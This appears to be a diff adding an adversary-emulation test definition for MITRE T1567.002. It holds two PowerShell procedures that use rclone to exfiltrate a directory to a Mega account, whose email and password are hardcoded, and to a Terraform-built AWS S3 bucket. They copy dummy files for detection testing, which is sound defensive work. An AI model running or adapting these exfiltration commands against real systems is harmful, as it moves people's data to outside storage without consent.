@@ -1,0 +1,141 @@
+{
+  "attack_technique": "T1567.002",
+  "display_name": "Exfiltration Over Web Service: Exfiltration to Cloud Storage",
+  "atomic_tests": [
+    {
+      "name": "Exfiltrate data with rclone to cloud Storage - Mega (Windows)",
+      "description": "This test uses rclone to exfiltrate data to a remote cloud storage instance. (Mega)\nSee https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/",
+      "supported_platforms": [
+        "windows"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "cleanup_command": "cd \"#{rclone_path}\"\n.\\rclone.exe purge #{remote_share}:test\n.\\rclone.exe config delete #{remote_share}:\nRemove-Item #{rclone_config_path}\\rclone -recurse -force -erroraction silentlycontinue\ncd c:\\\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\rclone.zip\"\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002\" -recurse -force",
+        "procedure": "New-Item #{rclone_config_path}\\rclone -ItemType directory\nNew-Item #{rclone_config_path}\\rclone\\rclone.conf\ncd \"#{rclone_path}\"\n.\\rclone.exe config create #{remote_share} mega\nset-Content #{rclone_config_path}\\rclone\\rclone.conf \"[#{remote_share}] `n type = mega `n user = #{mega_user_account} `n pass = #{mega_user_password}\"\n.\\rclone.exe copy --max-size 1700k \"#{dir_to_copy}\" #{remote_share}:test -v"
+      },
+      "input_arguments": [
+        {
+          "arg_name": "rclone_path",
+          "description": "Directory of rclone.exe",
+          "type": "path",
+          "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002\\rclone-v*\\"
+        },
+        {
+          "arg_name": "rclone_config_path",
+          "description": "Path to rclone's config file (default should be fine)",
+          "type": "path",
+          "default": "$env:appdata"
+        },
+        {
+          "arg_name": "dir_to_copy",
+          "description": "Directory to copy",
+          "type": "string",
+          "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002"
+        },
+        {
+          "arg_name": "mega_user_account",
+          "description": "Mega user account",
+          "type": "string",
+          "default": "atomictesting@outlook.com"
+        },
+        {
+          "arg_name": "mega_user_password",
+          "description": "Mega user password",
+          "type": "string",
+          "default": "vmcjt1A_LEMKEXXy0CKFoiFCEztpFLcZVNinHA"
+        },
+        {
+          "arg_name": "remote_share",
+          "description": "Remote Mega share",
+          "type": "string",
+          "default": "T1567002"
+        }
+      ],
+      "dependencies": [
+        {
+          "description": "rclone must exist at (#{rclone_path})",
+          "prereq_command": "if (Test-Path \"#{rclone_path}\") {exit 0} else {exit 1}",
+          "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://downloads.rclone.org/rclone-current-windows-amd64.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\rclone.zip\"\nExpand-archive -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\rclone.zip\" -destinationpath \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002\\\" -force"
+        }
+      ],
+      "auto_generated_guid": "8529ee44-279a-4a19-80bf-b846a40dda58"
+    },
+    {
+      "name": "Exfiltrate data with rclone to cloud Storage - AWS S3",
+      "description": "This test uses rclone to exfiltrate data to a remote cloud storage instance. (AWS S3)\nSee https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/",
+      "supported_platforms": [
+        "linux",
+        "macos"
+      ],
+      "executor": {
+        "name": "powershell",
+        "elevation_required": false,
+        "cleanup_command": "Write-Host \"Destroying AWS infrastructure... \" -NoNewLine\n$awsAccessKey = \"#{aws_access_key}\"\n$awsSecretKey = \"#{aws_secret_key}\"\ncd PathToAtomicsFolder/T1567.002/src/\nif ($awsAccessKey -eq \"\" -or $awsSecretKey -eq \"\") {\n  $env:AWS_PROFILE = \"#{aws_profile}\"\n} else {\n  $env:AWS_ACCESS_KEY_ID = \"$awsAccessKey\"\n  $env:AWS_SECRET_ACCESS_KEY = \"$awsSecretKey\"\n}\n$null = PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform destroy -var \"aws_region=#{aws_region}\" -auto-approve\nWrite-Host \"Done!\"",
+        "procedure": "Write-Host \"Deploying AWS infrastructure... \" -NoNewLine\n$awsAccessKey = \"#{aws_access_key}\"\n$awsSecretKey = \"#{aws_secret_key}\"\ncd PathToAtomicsFolder/T1567.002/src/\nif ($awsAccessKey -eq \"\" -or $awsSecretKey -eq \"\") {\n  $env:AWS_PROFILE = \"#{aws_profile}\"\n} else {\n  $env:AWS_ACCESS_KEY_ID = \"$awsAccessKey\"\n  $env:AWS_SECRET_ACCESS_KEY = \"$awsSecretKey\"\n}\n$null = PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform init\n$null = PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform apply -var \"aws_region=#{aws_region}\" -auto-approve\nWrite-Host \"Done!\"\nWrite-Host \"Generating rclone config... \" -NoNewLine\n$config = @\"\n[exfils3]\ntype = s3\nprovider = AWS\nenv_auth = true\nregion = #{aws_region}\n\"@\n$config | Out-File -FilePath \"PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone.conf\" -Encoding ascii\nWrite-Host \"Done!\"\nWrite-Host \"Exfiltrating data... \" -NoNewLine\n$bucket = \"$(PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform output bucket)\".Replace(\"`\"\",\"\")\ncd PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone-v*\n$null = ./rclone copy --max-size 1700k \"PathToAtomicsFolder/../ExternalPayloads/T1567.002/data/\" exfils3:$bucket --config \"PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone.conf\"\nWrite-Host \"Done!\""
+      },
+      "input_arguments": [
+        {
+          "arg_name": "rclone_path",
+          "description": "Directory of rclone.exe",
+          "type": "path",
+          "default": "PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone-v*/"
+        },
+        {
+          "arg_name": "exfil_directory",
+          "description": "Directory to exfiltrate",
+          "type": "string",
+          "default": "PathToAtomicsFolder/../ExternalPayloads/T1567.002/data/"
+        },
+        {
+          "arg_name": "terraform_path",
+          "description": "Directory of terraform",
+          "type": "path",
+          "default": "PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*"
+        },
+        {
+          "arg_name": "aws_access_key",
+          "description": "AWS Access Key",
+          "type": "string",
+          "default": null
+        },
+        {
+          "arg_name": "aws_secret_key",
+          "description": "AWS Secret Key",
+          "type": "string",
+          "default": null
+        },
+        {
+          "arg_name": "aws_region",
+          "description": "AWS Region",
+          "type": "string",
+          "default": "us-east-1"
+        },
+        {
+          "arg_name": "aws_profile",
+          "description": "AWS Profile",
+          "type": "string",
+          "default": "default"
+        }
+      ],
+      "dependencies": [
+        {
+          "description": "rclone must exist at (#{rclone_path})",
+          "prereq_command": "if (Test-Path \"#{rclone_path}\") {exit 0} else {exit 1}",
+          "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder/../ExternalPayloads/\" -ErrorAction Ignore -Force | Out-Null\n$arch = ([System.Runtime.InteropServices.RuntimeInformation]::OSArchitecture).ToString().ToLower()\n$operatingSystem = ([System.Runtime.InteropServices.RuntimeInformation]::OSDescription).ToString().ToLower()\nif ($operatingSystem -match \"darwin\") {\n  Invoke-WebRequest \"https://downloads.rclone.org/rclone-current-osx-$arch.zip\" -OutFile \"PathToAtomicsFolder/../ExternalPayloads/rclone.zip\"\n} elseif ($operatingSystem -match \"linux\") {\n  Invoke-WebRequest \"https://downloads.rclone.org/rclone-current-linux-$arch.zip\" -OutFile \"PathToAtomicsFolder/../ExternalPayloads/rclone.zip\"\n}\nExpand-archive -path \"PathToAtomicsFolder/../ExternalPayloads/rclone.zip\" -DestinationPath \"PathToAtomicsFolder/../ExternalPayloads/T1567.002/\" -force"
+        },
+        {
+          "description": "terraform must exist at (#{terraform_path})",
+          "prereq_command": "if (Test-Path \"#{terraform_path}\") {exit 0} else {exit 1}",
+          "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder/../ExternalPayloads/\" -ErrorAction Ignore -Force | Out-Null\n$arch = ([System.Runtime.InteropServices.RuntimeInformation]::OSArchitecture).ToString().ToLower()\n$operatingSystem = ([System.Runtime.InteropServices.RuntimeInformation]::OSDescription).ToString().ToLower()\nif ($operatingSystem -match \"darwin\") {\n  Invoke-WebRequest \"https://releases.hashicorp.com/terraform/1.10.5/terraform_1.10.5_darwin_$arch.zip\" -OutFile \"PathToAtomicsFolder/../ExternalPayloads/terraform.zip\"\n} elseif ($operatingSystem -match \"linux\") {\n  Invoke-WebRequest \"https://releases.hashicorp.com/terraform/1.10.5/terraform_1.10.5_linux_$arch.zip\" -OutFile \"PathToAtomicsFolder/../ExternalPayloads/terraform.zip\"\n}\nExpand-archive -path \"PathToAtomicsFolder/../ExternalPayloads/terraform.zip\" -DestinationPath \"PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v1.10.5/\" -force"
+        },
+        {
+          "description": "Must provide a valid directory or file path to exfiltrate to AWS S3",
+          "prereq_command": "if (Test-Path \"#{exfil_directory}\") {exit 0} else {exit 1}",
+          "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder/../ExternalPayloads/T1567.002/data\" -ErrorAction Ignore -Force | Out-Null\nforeach($fileSuffix in 1..10) {\n  Set-Content \"PathToAtomicsFolder/../ExternalPayloads/T1567.002/data/test$fileSuffix.txt\" \"This is a test file\"\n}"
+        }
+      ],
+      "auto_generated_guid": "a4b74723-5cee-4300-91c3-5e34166909b4"
+    }
+  ]
+}
